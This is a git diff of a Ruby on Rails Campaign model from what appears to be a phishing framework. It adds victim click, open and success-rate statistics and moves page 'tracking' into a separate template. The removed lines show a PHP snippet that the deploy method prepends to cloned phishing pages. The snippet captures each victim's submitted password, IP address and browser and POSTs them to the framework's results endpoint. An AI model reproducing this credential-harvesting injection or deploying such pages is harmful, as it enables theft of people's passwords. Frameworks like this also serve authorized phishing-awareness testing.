@@ -10,6 +10,8 @@ class Campaign < ActiveRecord::Base
   has_many :victims
   has_many :smtp_communications
   has_many :blasts
+  has_many :baits, through: :blasts
+  has_many :visits, through: :victims
 
   # allow mass asignment
   attr_accessible :name, :description, :active, :emails, :scope, :template_id, :test_email
@@ -31,6 +33,27 @@ class Campaign < ActiveRecord::Base
             :length => {:maximum => 60000}
   validates :scope, :numericality => {:greater_than_or_equal_to => 0},
             :length => {:maximum => 4}, :allow_nil => true
+
+  def self.clicks(campaign)
+    campaign.visits.where('extra is null OR extra not LIKE ?', "%EMAIL%").pluck(:victim_id).uniq.size
+  end
+
+  def self.opened(campaign)
+    campaign.visits.where(:extra => "SOURCE: EMAIL").pluck(:victim_id).uniq.size
+  end
+
+  def self.sent(campaign)
+    campaign.victims.where(sent: true).size
+  end
+
+  def self.success(campaign)
+    Campaign.sent(campaign) == 0 ? 
+        0 : (Campaign.clicks(campaign).to_f / Campaign.sent(campaign).to_f * 100.0).round(2)
+  end
+
+  def self.logfile(campaign)
+    Rails.root.to_s + "/log/www-#{campaign.campaign_settings.fqdn}-#{campaign.id}-access.log"
+  end
 
   def get_binding
     @campaign_id = id
@@ -156,41 +179,20 @@ class Campaign < ActiveRecord::Base
   end
 
   def deploy
+    # deploy phishing
     FileUtils.mkdir_p(deployment_directory)
     template.website_files.each do |page|
       loc = File.join(deployment_directory, page[:file])
-      #FileUtils.cp(page.file.current_path, loc)
-      File.open(loc, 'w') do |fo|
-        if File.extname(page.file.current_path) == '.php'
-          fo.puts "
-                  <?php
-                  $password = $_POST['PasswordForm'];
-                  if ($password != '') {
-                    $password = 'password:' . $password;
-                  }
-
-                  $uid = $_GET['uid'];
-                  $ip = $_SERVER['REMOTE_ADDR'];
-                  $browser = $_SERVER['HTTP_USER_AGENT'];
-                  $host = $_SERVER['HTTP_HOST'];
-                  $url = '#{PhishingFramework::SITE_URL}' . '/reports/results/'; 
-                  $data = array('uid' => $uid, 'browser_info' => $browser, 'ip_address' => $ip, 'extra' => $password);
-
-                  // use key 'http' even if you send the request to https://...
-                  $options = array(
-                          'http' => array(
-                          'header'  => \"Content-type: application/x-www-form-urlencoded\",
-                          'method'  => 'POST',
-                          'content' => http_build_query($data),
-                          ),
-                  );
-                  $context  = stream_context_create($options);
-                  $result = file_get_contents($url, false, $context); 
-                  ?>
-                  "
-        end
-        File.foreach(page.file.current_path) do |li|
-          fo.puts li
+      # copy template files to deployment directory
+      FileUtils.cp(page.file.current_path, loc)
+      if File.extname(page.file.current_path) == '.php'
+        File.open(loc, 'w') do |fo|
+          # add php tracking tags to each website file
+          tags = ERB.new File.read(File.join(Rails.root, "app/views/reports/tags.txt.erb"))
+          fo.puts tags.result
+          File.foreach(page.file.current_path) do |li|
+            fo.puts li
+          end
         end
       end
       if inflatable?(loc)
